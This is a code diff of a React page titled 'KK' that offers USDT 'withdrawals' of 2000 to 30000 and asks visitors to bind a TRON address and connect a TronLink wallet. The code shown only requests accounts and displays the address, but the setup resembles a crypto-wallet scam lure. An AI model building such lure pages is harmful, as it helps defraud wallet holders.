@@ -6,42 +6,97 @@ import { useState } from "react";
 export default function Home(){
 
 
-const [amount,setAmount]=useState("2000");
+const [amount,setAmount] = useState("2000");
 
-const [inputAddress,setInputAddress]=useState("");
+const [inputAddress,setInputAddress] = useState("");
 
-const [msg,setMsg]=useState("");
+const [msg,setMsg] = useState("");
 
-const [showWalletModal,setShowWalletModal]=useState(false);
-
-
+const [showWalletModal,setShowWalletModal] = useState(false);
 
 
 
-async function bindWallet(){
+
+
+// =========================
+// 打开 TronLink
+// =========================
+
+function openWallet(){
+
+
+const isMobile =
+/Android|iPhone|iPad|iPod/i.test(
+navigator.userAgent
+);
+
+
+
+if(isMobile){
+
+
+window.location.href =
+"tronlink://dapp?url=https://kk-usdt-withdraw.vercel.app";
+
+
+
+}else{
+
+
+if(
+(window as any).tronWeb
+){
+
+
+connectWallet();
+
+
+}else{
+
+
+setMsg(
+"请安装 TronLink Chrome 插件"
+);
+
+
+}
+
+
+}
+
+
+
+}
+
+
+
+
+
+
+
+// =========================
+// PC插件连接
+// =========================
+
+
+async function connectWallet(){
 
 
 try{
 
 
-if(!inputAddress.trim()){
-
-setMsg("请输入您的TRON钱包地址");
-
-return;
-
-}
+const tronWeb =
+(window as any).tronWeb;
 
 
 
-
-const tronReg=/^T[1-9A-HJ-NP-Za-km-z]{33}$/;
-
-
-if(!tronReg.test(inputAddress)){
+if(!tronWeb){
 
 
-setMsg("请输入正确的TRON钱包地址");
+setMsg(
+"未检测到TronLink"
+);
+
 
 return;
 
@@ -49,29 +104,24 @@ return;
 }
 
 
-
-
-
-// 检测 TronLink
 
 if(
-typeof window==="undefined" ||
-!(window as any).tronWeb
+tronWeb.request
 ){
 
 
-setShowWalletModal(true);
+await tronWeb.request({
 
-return;
+method:
+"tron_requestAccounts"
+
+});
 
 
 }
 
 
 
-
-
-const tronWeb=(window as any).tronWeb;
 
 
 const address =
@@ -79,24 +129,23 @@ tronWeb.defaultAddress.base58;
 
 
 
-if(!address){
-
-
-setMsg(
-"请先连接TronLink钱包"
-);
-
-
-return;
-
-
-}
-
+if(address){
 
 
 setMsg(
 "钱包连接成功："+address
 );
+
+
+}else{
+
+
+setMsg(
+"请授权连接钱包"
+);
+
+
+}
 
 
 
@@ -122,34 +171,102 @@ setMsg(
 
 
 
-function checkWallet(){
+// =========================
+// 点击绑定
+// =========================
 
 
-if(
-typeof window!=="undefined" &&
-(window as any).tronWeb
+async function bindWallet(){
+
+
+try{
+
+
+if(!inputAddress.trim()){
+
+
+setMsg(
+"请输入您的TRON钱包地址"
+);
+
+
+return;
+
+
+}
+
+
+
+
+
+
+const tronReg =
+/^T[1-9A-HJ-NP-Za-km-z]{33}$/;
+
+
+
+
+if(!tronReg.test(inputAddress)){
+
+
+setMsg(
+"请输入正确的TRON钱包地址"
+);
+
+
+return;
+
+
+}
+
+
+
+
+
+const tronWeb =
+(window as any).tronWeb;
+
+
+
+
+
+if(!tronWeb || 
+!tronWeb.defaultAddress.base58
 ){
 
 
-const address =
-(window as any)
-.tronWeb
-.defaultAddress
-.base58;
+setShowWalletModal(true);
+
+
+return;
+
+
+}
+
+
+
+
+const walletAddress =
+tronWeb.defaultAddress.base58;
 
 
 
 setMsg(
-"当前钱包："+address
+"钱包连接成功："+walletAddress
 );
 
 
 
-}else{
+
+
+}catch(e){
+
+
+console.log(e);
 
 
 setMsg(
-"请在TronLink钱包DApp浏览器打开"
+"连接失败"
 );
 
 
@@ -160,12 +277,18 @@ setMsg(
 }
 return (
 
+
 <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
+
+
+
 
 
 {/* Header */}
 
+
 <div className="flex justify-between items-center">
+
 
 
 <div className="flex items-center gap-3">
@@ -178,7 +301,10 @@ KK
 </div>
 
 
+
+
 <div>
+
 
 <div className="font-bold text-lg">
 
@@ -201,6 +327,8 @@ Secure Web3 Service
 
 
 
+
+
 <div className="rounded-full border border-white/10 px-4 py-2 text-sm">
 
 🟢 TRON Network
@@ -208,15 +336,22 @@ Secure Web3 Service
 </div>
 
 
+
 </div>
 
 
 
 
 
-{/* 标题 */}
+
+
+
+{/* 主标题 */}
+
+
 
 <div className="text-center mt-20">
+
 
 
 <div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
@@ -227,11 +362,14 @@ Secure Web3 Service
 
 
 
+
 <h1 className="text-4xl font-bold mt-8">
 
 提取地址绑定
 
 </h1>
+
+
 
 
 
@@ -246,6 +384,7 @@ Secure Web3 Service
 </p>
 
 
+
 </div>
 
 
@@ -253,7 +392,12 @@ Secure Web3 Service
 
 
 
-{/* 金额 */}
+
+
+
+{/* 金额选择 */}
+
+
 
 <div className="mt-12">
 
@@ -266,15 +410,25 @@ Secure Web3 Service
 
 
 
+
+
+
+
 <label
 
 className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
 amount==="2000"
+
 ?
+
 "border-cyan-400 bg-cyan-400/10"
+
 :
+
 "border-white/10 bg-white/5"
+
 }`}
+
 
 >
 
@@ -293,11 +447,14 @@ className="hidden"
 
 
 
+
 <div className="text-cyan-300 text-sm">
 
 ⭐ 新用户测试专用
 
 </div>
+
+
 
 
 
@@ -315,7 +472,12 @@ USDT
 </div>
 
 
+
 </label>
+
+
+
+
 
 
 
@@ -325,21 +487,32 @@ USDT
 
 
 {
+
+
 ["10000","20000","30000"].map(item=>(
+
 
 
 <label
 
 key={item}
 
+
 className={`rounded-2xl border py-5 text-center cursor-pointer ${
 amount===item
+
 ?
+
 "border-cyan-400 bg-cyan-400/20 text-cyan-300"
+
 :
+
 "border-white/10 bg-white/5"
+
 }
+
 ${item==="30000"?"col-span-2":""}
+
 `}
 
 
@@ -348,13 +521,19 @@ ${item==="30000"?"col-span-2":""}
 
 <input
 
+
 type="radio"
+
 
 checked={amount===item}
 
+
 onChange={()=>setAmount(item)}
 
+
 className="hidden"
+
+
 
 />
 
@@ -367,13 +546,18 @@ className="hidden"
 </label>
 
 
+
 ))
+
 
 }
 
 
 
 </div>
+
+
+
 
 
 
@@ -389,15 +573,27 @@ className="hidden"
 </span>
 
 
+
+</div>
+
+
+
 </div>
 
 
 
-</div>
 
-{/* 地址 */}
+
+
+
+
+
+{/* 地址输入 */}
+
+
 
 <div className="mt-12">
+
 
 
 <h2 className="font-bold text-lg mb-5">
@@ -405,6 +601,8 @@ className="hidden"
 输入接收地址
 
 </h2>
+
+
 
 
 
@@ -437,6 +635,7 @@ placeholder="请输入您的TRON钱包地址"
 className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
 
 
+
 />
 
 
@@ -458,6 +657,7 @@ onClick={bindWallet}
 className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
 
 
+
 >
 
 
@@ -465,8 +665,6 @@ className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r fr
 
 
 </button>
-
-
 
 
 
@@ -489,16 +687,7 @@ msg &&
 
 
 </div>
-
-
-
-
-
-
-
-
-
-{/* 安全区域 */}
+{/* 安全说明 */}
 
 
 <div className="mt-12 space-y-4">
@@ -527,7 +716,9 @@ msg &&
 </div>
 
 
+
 </div>
+
 
 
 
@@ -545,7 +736,9 @@ KK
 </div>
 
 
+
 Secure Web3 Infrastructure
+
 
 
 </footer>
@@ -558,7 +751,11 @@ Secure Web3 Infrastructure
 
 
 
-{/* TronLink提示弹窗 */}
+
+
+
+
+{/* TronLink连接弹窗 */}
 
 
 
@@ -567,18 +764,28 @@ Secure Web3 Infrastructure
 showWalletModal &&
 
 
+
 <div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">
+
 
 
 <div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">
 
 
 
+
+
+
+
 <img
+
 
 src="/tronlink-global.png"
 
+
 className="w-24 h-24 mx-auto rounded-2xl"
+
+
 
 />
 
@@ -586,11 +793,18 @@ className="w-24 h-24 mx-auto rounded-2xl"
 
 
 
+
+
 <h2 className="text-2xl font-bold mt-6">
 
-请在TronLink钱包中打开
+
+连接TRON钱包
+
 
 </h2>
+
+
+
 
 
 
@@ -598,16 +812,44 @@ className="w-24 h-24 mx-auto rounded-2xl"
 <p className="text-gray-400 mt-4 leading-7">
 
 
-当前浏览器未检测到TronLink
+连接您的TronLink钱包
 
 
 <br/>
 
 
-请复制网址到TronLink DApp浏览器打开
+安全访问DApp
 
 
 </p>
+
+
+
+
+
+
+
+<button
+
+
+
+onClick={openWallet}
+
+
+
+className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
+
+
+
+>
+
+
+连接 TronLink 钱包
+
+
+
+</button>
+
 
 
 
@@ -620,26 +862,36 @@ className="w-24 h-24 mx-auto rounded-2xl"
 onClick={()=>setShowWalletModal(false)}
 
 
-className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
+
+className="mt-5 text-gray-400"
+
 
 
 >
 
 
-知道了
+取消
+
 
 
 </button>
 
 
 
+
+
+
 </div>
 
 
+
 </div>
+
 
 
 }
+
+
 
 
 
